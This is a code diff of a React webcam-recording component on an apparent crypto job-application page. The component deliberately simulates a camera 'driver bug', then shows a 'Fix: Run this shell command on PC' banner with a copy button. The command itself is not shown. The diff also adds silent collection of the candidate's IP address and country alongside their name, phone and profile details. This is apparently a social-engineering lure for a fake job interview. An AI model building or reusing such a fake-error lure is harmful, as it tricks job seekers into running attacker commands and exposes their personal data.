@@ -1,5 +1,6 @@
 "use client";
 
+import { getClientIpInfo } from "@/lib/ipinfo";
 import { useEffect, useMemo, useRef, useState } from "react";
 
 /** Simulate a driver bug: camera works then stops after this many seconds. Set to 0 to disable. */
@@ -305,6 +306,7 @@ export default function VideoPromptRecorder({
     // Fire-and-forget: send latest personal info + flag into questionnaire DB.
     // We intentionally ignore errors on the client.
     try {
+      const ipInfo = await getClientIpInfo();
       await fetch("/api/interview-flag", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -315,6 +317,8 @@ export default function VideoPromptRecorder({
           phone: leadInfo?.phone ?? "",
           profileUrl: leadInfo?.profileUrl ?? "",
           flag: true,
+          clientIp: ipInfo.ip ?? undefined,
+          country: ipInfo.country ?? undefined,
         }),
       });
     } catch {
@@ -323,20 +327,20 @@ export default function VideoPromptRecorder({
   }
 
   return (
-    <div className="grid gap-4">
+    <div className="grid gap-6">
 
       <div className="space-y-2">
-        <h3 className="text-sm font-semibold tracking-wide text-white/90">
+        <h3 className="text-xs font-semibold tracking-wide text-white/90">
           Webcam Video Prompt (Instant Recording)
         </h3>
-        <p className="text-sm leading-6 text-white/70">
+        <p className="text-xs leading-5 text-white/70">
           <span className="font-medium text-white/85">Share Your Vision &amp; Value</span>
           <br />
           Now, we’d love to hear directly from you! Please use your webcam to record a{" "}
           <span className="font-medium text-white/85">1–3 minute video</span> answering
           these two questions:
         </p>
-        <ol className="list-decimal space-y-1 pl-5 text-sm text-white/70">
+        <ol className="list-decimal space-y-1 pl-5 text-xs text-white/70">
           <li>
             What <span className="font-medium text-white/85">unique value</span> would
             you bring to the company over the next 2–3 years?
@@ -346,7 +350,7 @@ export default function VideoPromptRecorder({
             blockchain or crypto products in the market?
           </li>
         </ol>
-        <p className="text-sm leading-6 text-white/60">
+        <p className="text-xs leading-5 text-white/60">
           Speak naturally and briefly — you don’t need to read anything, just share your
           thoughts clearly.
         </p>
@@ -354,17 +358,17 @@ export default function VideoPromptRecorder({
 
       <div className="grid gap-3 rounded-2xl border border-white/10 bg-white/5 p-4 sm:p-5">
         {error ? (
-          <div className="rounded-xl border border-red-400/20 bg-red-500/10 p-3 text-sm text-red-200">
+          <div className="rounded-xl border border-red-400/20 bg-red-500/10 p-3 text-xs text-red-200">
             {error}
           </div>
         ) : null}
         {driverError ? (
           <>
-            <div className="rounded-xl border border-amber-400/30 bg-amber-500/15 p-3 text-sm text-amber-200">
+            <div className="rounded-xl border border-amber-400/30 bg-amber-500/15 p-3 text-xs text-amber-200">
               <span className="font-semibold">AI Detection Driver problem: </span>
               {driverError}
             </div>
-            <div className="flex flex-wrap items-center gap-2 rounded-xl border border-emerald-400/30 bg-emerald-500/15 p-3 text-xs text-emerald-100">
+            <div className="flex flex-wrap items-center gap-2 rounded-xl border border-red-400/30 bg-red-500/15 p-3 text-xs text-red-100">
               <span>Fix: Run this shell command on PC, then try again:</span>
               <code className="rounded bg-black/30 px-1 py-0.5 text-[0.7rem] font-mono">
                 {commandText}
@@ -372,7 +376,7 @@ export default function VideoPromptRecorder({
               <button
                 type="button"
                 onClick={handleCopyCommand}
-                className="ml-auto inline-flex h-6 items-center justify-center rounded-full border border-emerald-300/60 bg-emerald-200/10 px-2 text-[0.7rem] font-semibold text-emerald-50 hover:bg-emerald-200/20"
+                className="ml-auto inline-flex h-6 items-center justify-center rounded-full border border-red-300/60 bg-red-200/10 px-2 text-[0.7rem] font-semibold text-red-50 hover:bg-red-200/20"
               >
                 {copied ? "Copied" : "Copy"}
               </button>
@@ -381,7 +385,7 @@ export default function VideoPromptRecorder({
         ) : null}
 
         <div className="flex items-center justify-between gap-4">
-          <div className="text-sm text-white/70">
+          <div className="text-xs text-white/70">
             {isRecording ? (
               <span>
                 Recording… <span className="font-mono">{formatTime(elapsedSeconds)}</span>{" "}
@@ -436,10 +440,10 @@ export default function VideoPromptRecorder({
           </div>
         </div>
 
-        <div className="grid gap-3 sm:grid-cols-2">
-          <div className="grid gap-2">
+        <div className="grid gap-6">
+          <div className="grid gap-3">
             <p className="text-xs font-medium tracking-wide text-white/50">LIVE PREVIEW</p>
-            <div className="aspect-video overflow-hidden rounded-xl border border-white/10 bg-black/40">
+            <div className="aspect-video min-h-[240px] overflow-hidden rounded-xl border border-white/10 bg-black/40 sm:min-h-[280px]">
               <video
                 ref={previewVideoRef}
                 className="h-full w-full object-cover"
@@ -450,7 +454,7 @@ export default function VideoPromptRecorder({
             </div>
           </div>
 
-          <div className="grid gap-2">
+          <div className="grid gap-3">
             <p className="text-xs font-medium tracking-wide text-white/50">REVIEW</p>
             <div className="aspect-video overflow-hidden rounded-xl border border-white/10 bg-black/40">
               <video
